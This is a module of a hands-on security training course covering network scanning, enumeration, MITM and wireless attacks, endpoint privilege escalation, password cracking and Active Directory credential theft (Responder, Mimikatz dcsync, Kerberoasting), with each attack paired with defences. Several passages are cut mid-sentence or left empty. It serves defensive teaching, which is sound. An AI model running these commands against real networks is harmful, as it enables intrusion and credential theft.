# Module 3 — Network, Endpoint & Identity Security

**Day 2 · Morning Session · ~4 hours (the deepest module of the week) · Hands-on lab: `labctl start m3`**

This is the biggest technical topic in the programme, so it gets the longest
session and the deepest treatment. It stands on **three pillars** — the three
places an attacker actually operates, and therefore the three places you must be
able to both **attack** (to understand) and **defend**:

- **Network** — the wire between machines: how services are exposed and
  enumerated, how traffic is intercepted (man-in-the-middle, Layer-2 poisoning),
  and how wireless is broken.
- **Endpoint** — the individual host: how an attacker runs code, hides, persists
  and escalates to administrator — and the evidence every one of those steps leaves.
- **Identity** — *who* a request is, and what it may do: Active Directory,
  Kerberos, credential theft, and the lateral movement that turns one foothold
  into a whole owned institution.

A network breach is almost never one dramatic event. It is a **chain** across
these three pillars — a scan, an exposed service, an intercepted credential, a
host running an implant, a stolen hash reused on the next machine — and the
professional's job is to understand every link well enough to **break it, and to
read it from the evidence it leaves behind.**

The module runs on two registers at once. The first is **conceptual** — how
networks and identity are structured, why attacks and defences live at specific
layers, and the architectural ideas (defence in depth, Zero Trust, segmentation,
tiering) that decide whether a small foothold stays small. The second is
deeply **practical** — real tools, run for real: **Nmap/masscan** and the SMB/
SNMP/LDAP enumeration suite to see what is exposed; **Responder, bettercap and
the aircrack-ng suite** to intercept traffic on wire and air; **Wireshark/
tcpdump** to read it; **winPEAS/linPEAS and GTFOBins** on the endpoint; **hashcat,
John and hydra** to break passwords; and **Mimikatz, impacket, CrackMapExec,
BloodHound and evil-winrm** against identity. You attack so you can defend.

::: warning | The ethics line is not optional — read it first
This module teaches genuine attacker techniques (ARP/LLMNR poisoning, wireless
cracking, credential dumping, Kerberoasting, lateral movement). That knowledge is
what makes you able to *stop* them. But every one is a weapon. **Use these tools
only against: the isolated `10.13.3.0/24` lab targets, equipment you personally

Running any of them against a network, Wi-Fi or account you do not own or have

## 1 · A Network Is Conversations

### 1.1 Ports, protocols and layers

Every network is computers having conversations. Each conversation uses a
**port** — a numbered door on a host (there are 65,535 of them per protocol) — and
a **protocol** — the language spoken through that door. Web traffic uses TCP port
80 (HTTP) or 443 (HTTPS); SSH uses 22; FTP uses 21; Windows remote desktop (RDP)
uses 3389; DNS uses UDP/TCP 53. When you hear "an exposed service", it means a
door is open to people who should not be able to reach it.

Two models organise this traffic into **layers**. The academic **OSI** model has
seven; the practical **TCP/IP** stack has four. You do not need to recite them,
but you must grasp the single idea that makes them useful to an investigator:
*attacks and defences each live at a specific layer, and naming the layer tells
you which control applies.*

| Layer (TCP/IP) | What lives here | Example attack | Example control |
|----------------|-----------------|----------------|-----------------|
| Application | HTTP, DNS, FTP, SSH | C2 over DNS; cleartext FTP credentials | DNS monitoring; encryption (SSH/HTTPS) |
| Transport | TCP/UDP ports | Port scanning; port-based backdoor | Host firewall; least-exposure |
| Internet | IP addresses, routing | IP spoofing; lateral movement | Segmentation; ACLs |
| Link | MAC addresses, the local wire | ARP spoofing; rogue device | 802.1X; port security |

::: key | The investigator's reflex
Name the **layer** and you have narrowed the **control**. A port scan is a
transport-layer event — the answer is least-exposure and a host firewall. A C2
lookup is an application-layer event — the answer is DNS monitoring. Train
yourself to locate every finding on this table before recommending a fix.
:::

### 1.2 The attacker's first question

An intruder's opening move on any network is blunt: **which doors are open, and
what is standing behind them?** They scan, they fingerprint the services, they
look for the one that is unauthenticated, unencrypted, or years out of date. Your
job is to answer that question about your *own* estate — continuously — before
someone else answers it about you. The uncomfortable truth in most organisations
is that the real inventory (what is actually listening on the network) differs
sharply from the inventory on paper. Scanning closes that gap.

### 1.3 The handshake, and what a port scan really does

Before you can read a scan you must know how a TCP connection is born: the
**three-way handshake**. The client sends **SYN** ("let's talk"), the server
replies **SYN-ACK** ("ok, let's talk"), the client sends **ACK** ("agreed") — and
only then does data flow. A port scanner *abuses* the start of that handshake to
learn a port's state without completing a connection:

DNS on 53) have no handshake, so UDP scanning is slower and noisier — Nmap infers
state from whether a reply or an ICMP "port unreachable" comes back.

## 2 · Nmap — Seeing What Is Exposed

**Nmap** is the scanner that maps a network: which hosts are alive, which ports
are open, and — crucially — *what software and version* sits behind each one.
The professional discipline is to move **from quiet to loud**: start with the
least intrusive probe that answers your question, and escalate only as needed.

```Terminal — the Nmap workflow, quiet to loud
# 1. Host discovery — who is alive? (no port scan yet)
nmap -sn 10.13.3.0/24

# 2. Targeted service + version detection on the ports that matter
nmap -sV -p 21,22,80,443,3389 10.13.3.0/24

# 3. Full TCP port sweep of one suspect host (find the odd port)
nmap -p- 10.13.3.40

# 4. Run a specific NSE script against a specific service
nmap --script ftp-anon -p21 10.13.3.20

# 5. Always save your evidence
nmap -sV -oN m3-scan.txt 10.13.3.0/24
```

Reading the output is the skill, not running the command. A `-sV` scan returns a
line per open port; the `VERSION` column is where investigations are won:

```Terminal — reading -sV output (your values will differ)
$ nmap -sV -p22 10.13.3.30
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.7 (protocol 2.0)

$ nmap --script ftp-anon -p21 10.13.3.20
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

The first result fingerprints the SSH host; the second tells you — in one line —
that *anyone* can log into the fileserver without a password. That is a finding a
board understands.

### 2.1 The Nmap Scripting Engine (NSE)

Beyond open/closed, NSE runs hundreds of targeted checks: `http-title` reveals
what a web server is serving (an "Admin Login" title with no auth is a red flag),
`ftp-anon` tests anonymous FTP, `ssl-enum-ciphers` grades TLS, `smb-vuln-*` tests
known SMB flaws. NSE is how a port scan becomes a vulnerability triage.

::: warning | Scanning is regulated — know the line
Running Nmap against a network you do not own or have written authorisation to
test is an offence under Ghana's **Cybersecurity Act 2020 (Act 1038)**. The same
command is lawful on your own estate and unlawful against a neighbour's. In this
lab the authorised scope is exactly `10.13.3.0/24` — nothing else, ever.
:::

### 2.2 The flags a professional actually chooses

Nmap has hundreds of options; a working analyst reaches for a handful and knows
*why*:

| Flag | What it does | When |
|------|--------------|------|
| `-sn` | Host discovery only (ping sweep), no port scan | "Who is alive?" first pass |
| `-sS` | SYN / "half-open" scan (default as root) — fast, never completes the handshake | The everyday TCP scan |
| `-sT` | Full TCP connect — used when you're not root | Unprivileged shells |
| `-sU` | UDP scan — slow but finds DNS, SNMP, etc. | Don't forget UDP services |
| `-sV` | Service + **version** detection | The column investigations are won on |
| `-O` / `-A` | OS fingerprint / **aggressive** (`-sV -O` + default scripts + traceroute) | Deep profile of one host |
| `-p-` / `--top-ports 100` | All 65,535 ports / the 100 most common | Find the odd high port / go fast |
| `-Pn` | Skip host discovery, treat the host as up | When a host blocks pings but is really there |
| `-T0 … -T5` | Timing: paranoid → insane | **`-T4`** is the sane default on a lab LAN |
| `-oN` / `-oG` / `-oX` / `-oA` | Save output: normal / greppable / XML / **all three** | **Always** — your evidence |

```Terminal — a real, evidence-saving scan of the lab
nmap -sS -sV -T4 -p- -oA m3-fullscan 10.13.3.0/24
#   half-open · version detect · fast · all ports · save normal+grep+XML
grep -E "open" m3-fullscan.gnmap          # grep the greppable output later
```

**NSE comes in categories** you can run as a group: `default` (safe, run with
`-sC`/`-A`), `safe`, `discovery`, `vuln` (checks for known CVEs), `auth`,
`brute`, and `exploit`. *Never* run `brute` or `exploit` categories outside an
authorised engagement — in this course, only against the lab targets.

::: key | The workflow to internalise
**Discover (`-sn`) → enumerate (`-sV -p-`) → investigate (targeted NSE) → save
(`-oA`).** Quiet to loud, and write everything to disk as you go — an
investigation you can't reproduce from saved evidence is not an investigation.
:::

## 3 · Active Enumeration — Making Services Talk

A port scan tells you a door is *open*; **enumeration** makes the service behind
it tell you everything about itself — users, shares, software versions, policies.
Most of a real engagement's findings come from this phase, not the scan. Each
protocol has its own interrogation tool, and a professional knows the handful that
matter. (Lab scope: `10.13.3.0/24` only.)

**Going faster and wider — masscan.** When the range is large, `masscan` sweeps it
at Internet speed, then you hand the live ports to Nmap for detail:

```Terminal — masscan for speed, Nmap for depth
sudo masscan 10.13.3.0/24 -p1-65535 --rate 1000 -oL masscan.txt   # find open ports fast
nmap -sV -p$(grep open masscan.txt | awk '{print $3}' | paste -sd, ) 10.13.3.10   # then fingerprint
```

**SMB / Windows file sharing (ports 139/445)** — the richest enumeration target on
a Windows network. SMB leaks shares, users, groups and password policy:

```Terminal — SMB enumeration
enum4linux-ng -A 10.13.3.10            # one-stop: shares, users, groups, policy (apt install enum4linux-ng)
smbclient -L //10.13.3.10 -N           # list shares as a null (anonymous) session
smbmap -H 10.13.3.10                    # shares + your read/write access to each
crackmapexec smb 10.13.3.0/24          # sweep a subnet: OS, domain, SMB signing (nxc = the newer name)
rpcclient -U "" -N 10.13.3.10          # then: enumdomusers, querydominfo, getdompwinfo
```

**SNMP (UDP 161)** — network gear and printers often expose SNMP with the default
community string `public`, which can dump the whole device config and user list:

```Terminal — SNMP
snmpwalk -v2c -c public 10.13.3.10               # walk the whole MIB (default community = public)
onesixtyone -c communities.txt 10.13.3.10        # brute the community string
```

**LDAP (389) / Active Directory, DNS, and web** round out the set:

```Terminal — LDAP, DNS, web
ldapsearch -x -H ldap://10.13.3.10 -b "dc=lab,dc=local"   # anonymous LDAP bind → AD objects
dig axfr lab.local @10.13.3.10                            # attempt a DNS zone transfer (misconfig → every record)
whatweb http://10.13.3.10                                 # fingerprint the web stack
nikto -h http://10.13.3.10                                # 6700+ web misconfig/vuln checks
```

::: key | Enumeration is where the findings are
A scan says "445 is open." Enumeration says "445 is open, SMB signing is **off**,
anonymous sessions are allowed, there is a share called `HR$` you can **read**,
and the password policy is 6 characters with no lockout." The second is a report;
the first is a to-do. Always enumerate every open service before concluding.
:::

## 4 · Traffic Analysis — Reading What Is Said

Nmap tells you which doors are open; **Wireshark** and **tcpdump** let you listen
to the conversations going through them. A packet capture (a `.pcap` file) is a
recording of raw network traffic; the analyst's craft is cutting the noise down
to the one conversation that matters.

### 4.1 Capture filters vs display filters

These are constantly confused, so fix the distinction now:

- A **capture filter** decides what is *recorded* (set before/while capturing;
  BPF syntax, e.g. `udp port 53`). Once traffic is discarded, it is gone.
- A **display filter** decides what is *shown* from what was recorded (set
  afterwards in Wireshark, e.g. `dns`, `ftp`, `ip.addr == 10.13.3.30`). It is
  non-destructive — you can refine it endlessly.

```Terminal — tcpdump: capture, then read back
# Capture everything to a file (capture filter: DNS only, to stay small)
tcpdump -i eth0 -w capture.pcap 'udp port 53'

# Read a saved capture back, DNS only, with payloads in ASCII
tcpdump -r capture.pcap -A 'udp port 53'
```

### 4.2 Following a stream — where cleartext credentials fall out

Protocols like FTP, HTTP and Telnet send everything — including usernames and
passwords — in **plaintext**. In Wireshark, right-click any packet of such a
conversation → **Follow → TCP Stream**, and the entire exchange reassembles in
front of you:

```Terminal — an FTP control stream reassembled (illustrative)
220 FileServer FTP ready
USER backupsvc
331 Password required for backupsvc
PASS S3rv!ce-2bf9
230 User backupsvc logged in
```

There it is: a username and password captured off the wire, because FTP never
encrypted them. The lesson for defenders is absolute — **cleartext protocols have
no place on a modern network**; replace FTP with SFTP/FTPS, Telnet with SSH.

### 4.3 Command-and-control beaconing

The signature finding in a compromised network is **C2 beaconing**: an infected
host contacting the same external destination at a **fixed interval**. Human and
application traffic is bursty and irregular — a person reads, pauses, clicks.
Malware is a **metronome**: it checks in with its controller every 30, 60 or 300
seconds, all day and all night, waiting for orders. That regularity is the tell.

::: key | The beacon signature
**Same destination + fixed interval + runs around the clock = beacon.** Real
malware often adds *jitter* (a little random variation) to hide, so look for
*approximate* regularity, not perfect clockwork. In this lab the beacon fires
roughly every 30 seconds.
:::

Why DNS? Roughly **90% of malware uses DNS** to reach its controller, because DNS
is allowed out of almost every network (block it and the internet stops working)
and is rarely inspected as closely as web traffic. A host repeatedly resolving
`cdn-update.ddns.net` — a dynamic-DNS domain dressed up to look like a software
updater — every half-minute is not updating anything. It is phoning home.
Monitoring and logging DNS is therefore one of the highest-value, lowest-cost
detections a Ghanaian organisation can deploy.

### 4.4 Driving Wireshark like an analyst

Three skills turn a wall of packets into findings:

**Display filters** — the ones you use every day:

| Filter | Shows |
|--------|-------|
| `dns` · `http` · `ftp` | one protocol only |
| `ip.addr == 10.13.3.30` | everything to/from one host |
| `tcp.port == 21` | one service |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | bare SYNs — **a port scan in progress** |
| `dns.qry.name contains "ddns"` | suspicious dynamic-DNS lookups |
| `tcp.stream eq 3` | just the Nth conversation |

**Statistics menu** — where the story is, without reading every packet:

- **Protocol Hierarchy** — what is this capture *made of*? Unexpected protocols stand out.
- **Conversations** — who talks to whom; **sort by Bytes** and a data exfiltration
  jumps out as one huge outbound conversation, a beacon as many tiny identical ones.
- **Expert Information** — Wireshark's own flags (retransmissions, resets, malformed).

**Follow Stream & Export Objects** — right-click → **Follow → TCP/HTTP/TLS Stream**
reassembles one conversation (how you read the FTP login); **File → Export Objects
→ HTTP/SMB** pulls transferred *files* straight out of the capture.

::: key | The beacon-detection workflow
Filter to `dns`, note the one host repeatedly resolving an odd domain, then watch
the **time between those packets** (add `frame.time_delta` as a column, or use
**Statistics → I/O Graph**). Human DNS is irregular; a beacon is a near-constant
interval — the periodicity *is* the detection, even when the payload is encrypted.
:::

## 5 · Man-in-the-Middle & Layer-2 Attacks

Scanning is loud and remote; the quieter, more dangerous move is to **get in the
middle** of a conversation on the local network and read or alter it. These are
**Layer-2** (link-layer) attacks — they abuse the trust built into how machines
find each other on a LAN. They are devastating precisely because they need no
exploit and no password: they abuse protocols working exactly as designed.

**ARP spoofing / poisoning.** On a LAN, machines map IP → MAC with **ARP**, a
protocol with *no authentication*: whoever answers an "who has 10.13.3.1?" request
is believed. An attacker answers for the gateway, so every victim's traffic flows
through the attacker first (MITM). ATT&CK **T1557.002**.

```Terminal — ARP spoof + intercept (lab/own equipment only)

sudo bettercap -iface eth0

  > set arp.spoof.targets 10.13.3.30

# classic equivalents
sudo arpspoof -i eth0 -t 10.13.3.30 10.13.3.1     # (dsniff)
sudo ettercap -T -M arp /10.13.3.30// /10.13.3.1//
```

**LLMNR / NBT-NS poisoning — the Windows classic.** When a Windows machine can't
resolve a name via DNS, it *shouts to the whole LAN* over LLMNR/NBT-NS: "does
anyone know `fileservr`?" An attacker answers "yes, me!", the victim tries to
authenticate, and hands over its **NetNTLM hash** — which you then crack offline or
relay. **Responder** automates this and it still works in most AD networks.

```Terminal — Responder captures NetNTLM hashes from the air
sudo responder -I eth0 -wv          # poison LLMNR/NBT-NS/MDNS, serve rogue auth
# → captured hashes land in /usr/share/responder/logs/  → crack with hashcat (below)
# Relay instead of crack (if SMB signing is off):
impacket-ntlmrelayx -tf targets.txt -smb2support
```

**DNS spoofing & SSL-stripping** ride on top of a MITM: once in the middle you can
forge DNS answers (send the victim to your fake page) or try to downgrade HTTPS to
HTTP (`sslstrip`/bettercap `hstshijack`) — largely defeated today by **HSTS** and
browser defaults, which is the lesson.

::: key | The Layer-2 defences (name one per attack)
- **ARP spoofing →** Dynamic ARP Inspection (DAI) + DHCP snooping on switches; static ARP for critical hosts.
- **LLMNR/NBT-NS →** **disable LLMNR and NBT-NS** via Group Policy (almost no modern network needs them); enforce **SMB signing** to kill relay.
- **DNS spoofing →** DNSSEC, trusted internal resolvers, 802.1X so rogue devices can't join.
- **SSL-stripping →** HSTS (preload), HTTPS-everywhere, and never trusting an unexpected certificate warning.
- **All of them →** these are *local-network* attacks: **network segmentation and 802.1X port authentication** shrink where an attacker can even attempt them.
:::

## 6 · Wireless Network Security

Wi-Fi extends your network into the car park. It is a pillar of its own because
the medium is *shared air* — an attacker never has to touch a cable. You must
understand how it is attacked to secure it.

**How WPA2-PSK works (and breaks).** When a device joins, it performs a **4-way
handshake** that proves both sides know the passphrase *without sending it*. But
the handshake contains enough material to **guess the passphrase offline**: an
attacker captures the handshake (often forcing it by **deauthenticating** a client
so it reconnects), then throws a wordlist at it. Weak passphrases fall in minutes.
**WPA3** fixes this with SAE (Dragonfly), which resists offline guessing.

```Terminal — capture a WPA2 handshake and crack it (YOUR OWN AP ONLY)
sudo airmon-ng start wlan0                         # put the card into monitor mode
sudo airodump-ng wlan0mon                          # list APs — note the target BSSID + channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon   # capture on that channel
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon         # force a client to reconnect → handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap        # crack the captured handshake

# modern, faster path: hcxdumptool → hashcat mode 22000
sudo hcxdumptool -i wlan0mon -o dump.pcapng
hcxpcapngtool -o hash.hc22000 dump.pcapng
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

**Evil Twin.** The attacker stands up a fake access point with the *same name* as
the real one (stronger signal), victims auto-connect, and now the attacker is the
network — a captive-portal page can harvest the real Wi-Fi password or credentials
(`wifiphisher`, `hostapd` + a rogue DHCP/DNS).

**WPS** (the 8-digit pin for easy pairing) is brute-forceable (`reaver`, `bully`)
and should be **off**.

::: ghana | Why wireless matters here
Branch offices, hotels, agent networks and SME routers across the region run WPA2
with weak or default passphrases and WPS enabled. One cracked passphrase puts an
attacker *inside* the network, past the perimeter firewall, ready for the Layer-2
and identity attacks above. Wireless is often the easiest way in.
:::

::: key | The wireless defences
**WPA3** (or WPA2 with a long, random passphrase of 15+ characters that no
wordlist contains); **disable WPS**; **802.1X / WPA-Enterprise** (per-user
certificates, no shared key) for corporate SSIDs; **Protected Management Frames
(PMF/802.11w)** to blunt deauth; a **separate, isolated guest network**; and
treat Wi-Fi as *untrusted* — put it outside, not inside, your trust boundary.
:::

## 7 · Endpoint Evidence & Security — Interrogating the Host

Network evidence tells you *that* a host is misbehaving; the host's own
**connection table** tells you *what process is doing it*. `netstat` (or `ss` on
modern Linux) lists every socket: what the machine is **listening** on and what
it is **connected** to.

```Terminal — the two states that matter
# Windows (as captured on the suspect host)
netstat -ano          # all connections + owning process IDs

# Linux equivalent
ss -tulpan
```

Two states decide the investigation:

- **`LISTEN`** — the host is waiting for an inbound connection on this port. An
  unexpected high port in `LISTEN` (e.g. 4444, 1337, 31337) is a classic
  **backdoor** — a door the malware opened for its operator to walk back in.
- **`ESTABLISHED`** — an active connection to a remote address. An `ESTABLISHED`
  line to an unfamiliar public IP, owned by a suspicious process, is the host
  *actively* talking to its controller.

### 7.1 Masquerading — the process that is almost right

Malware hides by naming itself after something you trust. Windows legitimately
runs **`svchost.exe`** (dozens of them). An attacker names their implant
**`svch0st.exe`** — a zero for the letter *o* — so a tired analyst scrolling a
process list slides right past it. This is MITRE ATT&CK **Masquerading
(T1036)**, and catching it is a matter of reading *carefully*:

```Terminal — a netstat capture from the infected host (values vary per student)
Proto  Local Address        Foreign Address        State         PID/Program
TCP    0.0.0.0:4444         0.0.0.0:0              LISTENING     3391/svch0st.exe
TCP    10.13.3.30:49713     203.0.113.47:443      ESTABLISHED   3391/svch0st.exe
TCP    10.13.3.30:49720     10.13.3.20:21         ESTABLISHED   2208/ftp.exe
```

Read that table like a story. A process spelled `svch0st` is **listening** on
4444 (the backdoor) **and** holds an **established** connection to a public IP on
443 (the C2). The same PID owns both — one implant, two behaviours. And the
foreign IP on that established line should **match** the address the beacon domain
from the capture resolves to. When three sources agree, you have proof, not a
hunch.

::: key | Correlation is the whole game
Any single source can mislead. The scan shows exposure, the capture shows
behaviour, the host table shows the responsible process — and the **C2 IP in the
netstat must match the C2 domain in the pcap.** An analyst who correlates writes
a conclusion that survives scrutiny; one who reports a single tool's output
writes a guess.
:::

---

### 7.2 Reading a host properly — Windows & Linux internals

`netstat` is one window; a real triage reads several. The single most useful habit
is checking **parent-child process lineage**: `winword.exe` spawning
`powershell.exe` which spawns `cmd.exe` is a macro-dropper, not a document.

```Terminal — Windows: what is running, and what launches at boot
tasklist /v                         # processes + the user context
wmic process get Name,ParentProcessId,ProcessId,CommandLine   # lineage + full command line
Get-Process | Sort CPU -desc        # PowerShell equivalent
schtasks /query /fo LIST /v         # scheduled tasks (a top persistence spot)
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"   # autostart entries
```

The **Sysinternals** suite is the professional's lens: **Process Explorer** (the
process tree, signatures, and a one-click VirusTotal check), **Autoruns** (every
single thing that starts automatically — the first place to hunt persistence), and
**Procmon** (live file/registry/process activity). For *logging* so you can
investigate later, deploy **Sysmon** — it records process creation with command
lines, network connections and more into the event log, and is the backbone of
endpoint detection.

```Terminal — Linux: the equivalents
ps auxf                             # process tree (f = forest view)
ls -l /proc/<pid>/exe               # the real binary behind a PID (even if deleted/renamed)
cat /proc/<pid>/cmdline | tr '\0' ' '   # its full command line
lsof -p <pid>                       # files + sockets it holds open
systemctl list-units --type=service # running services
crontab -l ; ls -la /etc/cron.*     # scheduled jobs (classic persistence)
ausearch -m EXECVE -ts recent       # auditd: what was executed recently
last ; w                            # who logged in / is logged in
cat ~/.ssh/authorized_keys          # an attacker's added key = silent persistence
```

### 7.3 Persistence — how an implant survives a reboot

Running once is easy; *surviving a reboot* is what makes a foothold durable.
Attackers plant a launch point in one of a well-known set of places — which is
exactly where you hunt. (ATT&CK tactic **TA0003 Persistence**.)

| OS | Mechanism | Where to look | ATT&CK |
|----|-----------|---------------|--------|
| Windows | Run / RunOnce registry keys | `HKLM/HKCU\...\CurrentVersion\Run` | T1547.001 |
| Windows | Scheduled task | `schtasks /query`, Autoruns | T1053.005 |
| Windows | New / hijacked service | `sc query`, Autoruns | T1543.003 |
| Windows | WMI event subscription | `Get-WMIObject __EventFilter` | T1546.003 |
| Linux | cron / systemd timer | `crontab -l`, `/etc/cron.*`, `systemctl list-timers` | T1053.003 |
| Linux | systemd service / `.bashrc` / rc.local | `systemctl`, shell rc files | T1543.002 |
| Linux | SSH `authorized_keys` | `~/.ssh/authorized_keys` | T1098.004 |
| Any | Living-off-the-land binary | signed OS tool doing odd things | T1218 / T1059 |

**Living off the land (LOLBAS / GTFOBins).** The stealthiest attackers drop *no*
malware — they abuse tools already present and trusted. On Windows, `certutil` can
download a file, `rundll32`/`mshta` can execute code, `bitsadmin` can transfer —
catalogued at **LOLBAS**. On Linux, dozens of ordinary binaries can be bent to
read files, spawn shells or escalate — catalogued at **GTFOBins** (the same site
behind the RT lab's `sudo` escape). You hunt these by behaviour, not by filename:
a signed system tool making an external connection is the tell.

### 7.4 Privilege escalation — from foothold to administrator

An attacker's first shell is rarely privileged. **Privilege escalation** turns a
normal user into `root`/`SYSTEM`, and it is almost always a *misconfiguration*, not
an exploit. Enumeration scripts automate the hunt:

```Terminal — find the escalation path (lab / sanctioned systems only)
# Linux
./linpeas.sh                        # the standard Linux privesc enumerator (highlights wins in red)
sudo -l                             # what can I run as root? (GTFOBins the result — as in the RT lab)
find / -perm -4000 -type f 2>/dev/null   # SUID binaries (a classic path)
getcap -r / 2>/dev/null             # Linux capabilities that grant power

# Windows
winpeas.exe                         # the Windows equivalent
whoami /priv                        # dangerous token privileges (SeImpersonate → "potato" attacks)
```

The common Linux paths: a **sudo** rule you can abuse (GTFOBins), a **SUID**
binary, a writable **cron** job, a dangerous **capability**, or a world-writable
service file. On Windows: **unquoted service paths**, **weak service permissions**
(you can replace the binary a `SYSTEM` service runs), **`AlwaysInstallElevated`**,
or token-privilege abuse. The defence is the mirror image: **least privilege**,
remove needless SUID/sudo, quote service paths and lock their permissions, patch,
and monitor for the enumeration itself.

::: key | Privilege escalation is a hygiene failure
Almost every local-privesc win is something an administrator *left* wrong: a
NOPASSWD sudo line, a service only `Users` can overwrite, a forgotten SUID copy of
a shell. Audit for these with the *same* tools attackers use (linPEAS/winPEAS) and
you remove the paths before they're walked.
:::

## 8 · Password Attacks — Cracking Credentials

Credentials are the master key, and most are weaker than their owners think. There
are two fundamentally different attacks, and confusing them is a common mistake.

**Online** attacks guess against a *live* service (SSH, RDP, a web login). They are
slow, noisy, and trip account lockouts — but they need no stolen data:

```Terminal — online guessing (lab / sanctioned only)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.13.3.30      # SSH
hydra -L users.txt -P pass.txt 10.13.3.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"                               # web form
# Password SPRAY (one common password across many users — evades lockout):
crackmapexec smb 10.13.3.0/24 -u users.txt -p 'Spring2025!' --continue-on-success
kerbrute passwordspray -d lab.local users.txt 'Welcome1'                 # against Kerberos
```

**Offline** attacks work on *stolen hashes* (from a database dump, LSASS, Responder,
`/etc/shadow`). No lockout, no network — just your GPU versus their password. This
is why a breached password database is a catastrophe even when "the passwords were
hashed":

```Terminal — offline cracking
hashid '$2y$10$...'                 # identify the hash type first
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt       # John the Ripper
john --show hashes.txt

hashcat -m 0    hashes.txt rockyou.txt                 # -m 0 = raw MD5
hashcat -m 1800 shadow.txt rockyou.txt                 # -m 1800 = Linux sha512crypt
hashcat -m 1000 ntlm.txt   rockyou.txt                 # -m 1000 = Windows NTLM
hashcat -m 22000 wifi.hc22000 rockyou.txt              # WPA
hashcat -m 0 hashes.txt rockyou.txt -r rules/best64.rule   # mangle words with RULES
hashcat -m 0 hashes.txt -a 3 '?u?l?l?l?l?d?d?d'            # MASK attack (pattern brute force)
```

The hierarchy of effort: a **dictionary** of known/leaked words (rockyou) is
fastest; **rules** mutate them (`Password` → `P@ssw0rd!`); a **mask** brute-forces
a known pattern; pure brute force is the last resort. Slow hashes (bcrypt, argon2,
sha512crypt) are deliberately expensive, so they buy defenders time; fast hashes
(MD5, NTLM) fall almost instantly.

::: key | The defences that actually work
- **Length beats complexity:** a 15+ character passphrase defeats wordlists and masks; `P@ss1` does not.
- **MFA** makes a cracked password insufficient on its own — the single highest-value control.
- **Slow, salted hashes** (bcrypt/argon2) for anything you store; never MD5/SHA1/unsalted.
- **Block leaked passwords** at sign-up using the **Have I Been Pwned** Pwned-Passwords API (see Tools & Resources).
- **Lockout + alerting** on online guessing; **detect spraying** (one password, many accounts, many failures).
:::

## 9 · Identity & Active Directory Attacks — How a Foothold Becomes a Catastrophe

Finding the open door is half the module; the other half — the part that turns one
infected workstation into an owned institution — is **identity**. Knowing *what*
connects is not enough; you must know *who*. **Authentication** proves identity;
**authorisation** decides what that identity may do. Weak identity is how almost
every breach *escalates*.

### 9.1 The enterprise identity backbone

Most organisations run **Active Directory (AD)**: a central directory where a
**domain controller (DC)** holds every account, and **Kerberos** issues time-
limited *tickets* that prove "this user is who they say". It is enormously
convenient — one login reaches everything the user is entitled to — and that is
exactly why it is the attacker's prize. **Compromise the domain controller and you
own every account and every machine.** The DC is the crown jewel behind the crown
jewels.

### 9.2 Credential theft and lateral movement

Once an attacker has local **admin on one box** (via the exposed service, the
cracked password, or the phishing foothold), they rarely stop there. They harvest
credentials from memory (the `LSASS` process holds password hashes and Kerberos
tickets) and then **move sideways**:

- **Pass-the-Hash (PtH)** — reuse a stolen NTLM **hash** to authenticate as that
  user *without ever knowing the plaintext*. (ATT&CK **T1550.002**.)
- **Pass-the-Ticket / Kerberoasting** — steal or forge Kerberos tickets to move as
  a privileged account. (T1558.)
- **Lateral movement** itself — hopping host → host with those stolen credentials
  over **SMB** (admin shares, PsExec), **RDP** (3389), or **WinRM**. (T1021
  Remote Services; T1003 for the credential dump that fuels it.)

::: key | Shared local-admin passwords are how a toehold becomes a takeover
Target (2013) and NotPetya (2017) were not clever zero-days at the spread stage —
they were **lateral movement across a flat network using the same local-admin
credential everywhere.** One stolen hash unlocked thousands of machines. This is
the single most important escalation pattern to understand.
:::

### 9.3 Dumping credentials with Mimikatz

Windows caches secrets (hashes, Kerberos tickets, sometimes plaintext) in the
**LSASS** process. With local admin, **Mimikatz** reads them straight out of
memory — this is what fuels every pass-the-hash and pass-the-ticket.

```Terminal — Mimikatz / secretsdump (lab or sanctioned AD only)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords        # hashes + plaintext for logged-on users
mimikatz # sekurlsa::tickets /export       # Kerberos tickets → pass-the-ticket
mimikatz # lsadump::dcsync /user:krbtgt    # impersonate a DC and pull ANY account's hash
impacket-secretsdump lab/admin@10.13.3.10  # remote equivalent, no binary dropped
```

**`dcsync`** is the crown-jewel move: it abuses legitimate DC replication to
extract any account's hash — including `krbtgt`, which lets an attacker forge a
**Golden Ticket** valid for the whole domain. The defences: **Credential Guard**
and **LSASS protection (RunAsPPL)** to stop the memory read; never log privileged
accounts onto workstations; and **EDR** that alerts on LSASS access.

### 9.4 Kerberoasting & AS-REP roasting — cracking AD without admin

Two attacks any *ordinary* domain user can run, because they abuse Kerberos by
design — which is why they are everywhere:

- **Kerberoasting (T1558.003):** any user can request a service ticket for an
  account that has a Service Principal Name (SPN). The ticket is encrypted with
  the **service account's password hash**, so you crack it **offline** — and
  service accounts often have old, weak, never-rotated passwords.
- **AS-REP roasting (T1558.004):** accounts with "do not require Kerberos
  pre-authentication" set will hand you a crackable blob with **no credentials at all**.

```Terminal — the roasting toolkit
impacket-GetUserSPNs  lab.local/user:pass -dc-ip 10.13.3.10 -request   # Kerberoastable hashes
```

Defence: give service accounts **25+ character random passwords** or use **group
Managed Service Accounts (gMSA)** that rotate automatically; **require Kerberos
pre-authentication**; and alert on abnormal volumes of TGS requests.

### 9.5 Mapping attack paths with BloodHound

A real AD has thousands of users, groups and permissions — too complex to reason
about by hand. **BloodHound** collects that data (with the `SharpHound` or
`bloodhound-python` collector) and draws it as a **graph**, then answers the one
question that matters: *"what is the shortest path from the account I just
compromised to Domain Admin?"* Attackers use it to find the path; **defenders use
the exact same tool to find and cut those paths before anyone walks them.**

```Terminal — collect and analyse
bloodhound-python -u user -p pass -d lab.local -ns 10.13.3.10 -c All   # collect from Linux
# → load the JSON into the BloodHound GUI → run "Shortest Paths to Domain Admins"
```

### 9.6 The lateral-movement toolkit

